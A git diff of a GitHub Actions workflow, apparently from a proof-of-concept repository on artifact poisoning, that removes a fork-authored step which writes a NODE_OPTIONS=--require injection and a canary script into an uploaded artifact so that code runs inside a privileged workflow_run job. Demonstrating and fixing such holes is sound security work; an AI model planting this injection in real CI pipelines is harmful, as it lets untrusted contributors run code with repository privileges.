@@ -1,5 +1,9 @@
 name: Validate
 
+# The unprivileged producer. For a `pull_request` event GitHub runs this file from the pull
+# request's own merge ref, so a fork author controls it and everything it uploads. This copy on
+# the default branch is the benign original; see the four pull requests for the fork's versions.
+
 on:
   pull_request:
   push:
@@ -14,35 +18,14 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      # ---------------------------------------------------------------------
-      # THE ONLY CHANGE A FORK HAS TO MAKE.
-      # For a `pull_request` event GitHub runs the workflow file from the pull
-      # request's own merge ref, so this file is authored by the fork. The
-      # artifact name the privileged consumer selects ("env") and every byte
-      # inside it are therefore chosen by the pull request author.
-      # Contents are a console.log and two environment variables. No secret is
-      # read, written, or exfiltrated.
-      # ---------------------------------------------------------------------
       - name: Save PR number
         if: github.event_name == 'pull_request'
+        env:
+          PR_NUMBER: ${{ github.event.number }}
         run: |
           mkdir -p ./env
-          W=/home/runner/work/ci-artifact-env-poc/ci-artifact-env-poc
-          cat > ./env/env <<EOT
-          PR_NUMBER=${{ github.event.number }}
-          POC_CANARY=injected-by-fork-Iradahkoreanway
-          NODE_OPTIONS=--require ${W}/poc-canary.js
-          EOT
-          cat > ./env/poc-canary.js <<'EOT'
-          console.log('[poc-canary] NODE_OPTIONS --require loaded this file inside the privileged '
-            + 'workflow_run job. repo=' + process.env.GITHUB_REPOSITORY
-            + ' ref=' + process.env.GITHUB_REF
-            + ' workflow=' + process.env.GITHUB_WORKFLOW);
-          EOT
-          echo "--- artifact contents the fork is about to upload ---"
-          cat ./env/env
-          echo "---"
-          cat ./env/poc-canary.js
+          echo PR_NUMBER=$PR_NUMBER > ./env/env
+          echo GITHUB_SHA=${{ github.sha }} >> ./env/env
 
       - uses: actions/upload-artifact@v4
         with:
